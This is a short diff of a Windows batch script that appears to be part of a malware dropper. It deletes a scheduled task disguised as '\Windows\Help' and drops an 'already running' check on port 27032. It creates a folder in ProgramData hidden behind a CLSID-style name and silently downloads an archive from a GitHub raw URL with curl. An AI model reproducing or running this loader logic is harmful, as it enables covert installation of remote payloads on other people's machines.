@@ -1,5 +1,4 @@
 schtasks /Delete /TN "\Windows\Help" /F
-netstat -ano | find ":27032" >nul & exit /b
 
 mkdir %ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
 curl.exe -s -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\insta.rar" https://github.com/vltex/1/raw/1/i/insta.rar
